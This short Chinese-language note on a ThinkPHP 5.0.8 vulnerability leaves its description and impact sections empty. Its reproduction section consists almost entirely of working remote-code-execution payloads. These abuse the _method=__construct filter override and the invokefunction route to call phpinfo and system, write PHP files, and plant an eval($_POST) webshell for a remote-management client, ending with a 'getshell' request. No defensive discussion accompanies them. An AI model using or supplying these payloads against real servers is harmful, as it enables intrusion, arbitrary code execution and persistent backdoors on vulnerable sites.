Thinkphp 5.0.8
==============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    http://wwww.0-sec.org/public


    _method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo
    _method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
    _method=__construct&method=get&filter[]=call_user_func&get[0]=phpinfo&get[1]=1
    c=system&f=calc&_method=filter

> 写入文件

    http://wwww.0-sec.org/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=uploads/1.php&vars[1][]=<?php ?>

> 直接用菜刀连

    http://wwww.0-sec.org/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1])

> getshell

    POST

    s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
